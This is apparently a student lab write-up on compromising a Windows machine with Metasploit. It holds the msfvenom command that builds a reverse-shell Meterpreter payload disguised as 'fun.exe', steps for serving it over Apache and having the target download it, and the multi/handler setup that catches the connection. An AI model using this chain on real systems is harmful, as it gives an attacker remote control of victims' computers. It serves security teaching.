# EX 06-Compromising-windows-using-Metasploit
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="731" height="582" alt="image" src="https://github.com/user-attachments/assets/0963a72c-7b5e-4224-b0ee-db3c15d3d4e9" />




Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="737" height="580" alt="image" src="https://github.com/user-attachments/assets/ab68267d-d848-40d8-953a-5a107a33c795" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="722" height="541" alt="image" src="https://github.com/user-attachments/assets/05ec241c-c7de-4847-98da-a1a615ccb3c1" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="725" height="520" alt="image" src="https://github.com/user-attachments/assets/2e52347a-8a2c-4a2a-b818-26ec28c14b08" />



Check the status of apache2
## OUTPUT:

<img width="717" height="561" alt="image" src="https://github.com/user-attachments/assets/02f0a257-bf8d-4da7-a7da-44fa8fb85313" />


Invoke msfconsole:
## OUTPUT:

<img width="717" height="555" alt="image" src="https://github.com/user-attachments/assets/10f6ebea-2f89-4a2e-8b9b-23207ba13d3e" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="956" height="863" alt="image" src="https://github.com/user-attachments/assets/637761b0-67dd-40cd-ab3a-9a08324d94eb" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1027" height="572" alt="image" src="https://github.com/user-attachments/assets/de608d80-bb21-4c44-8439-985ec3d228aa" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
